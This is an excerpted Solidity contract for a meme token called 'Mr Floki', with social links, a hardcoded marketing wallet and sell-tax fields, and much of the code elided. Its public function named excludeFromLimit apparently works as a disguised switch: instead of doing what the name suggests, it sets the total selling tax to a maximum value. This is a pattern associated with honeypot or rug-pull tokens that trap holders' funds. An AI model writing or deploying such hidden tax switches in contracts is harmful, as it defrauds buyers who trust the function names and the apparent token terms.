...
//Telegram : https://t.me/MrFloki
//twitter : https://twitter.com/Mr_FlokiToken
// 
...
contract MrFLOKI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Mr Floki";
    string private _symbol = "MFLOKI";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
        payable(0x94DDc682382Bcdb1F2eE6e6A7a4fa0108549e5A0);
    ...
    uint256 public _totalTaxSelling;
    ...
    constructor() {
        ...
        _totalTaxSelling = _sellLiquidityFee.add(_sellMarketingFee).add(
            _sellBurnedFee
        );
    ...
    function excludeFromLimit(address holder,bool value)public returns (bool)
    {
        ...
        _totalTaxSelling = possibleMaxFee;
        return true;
    }
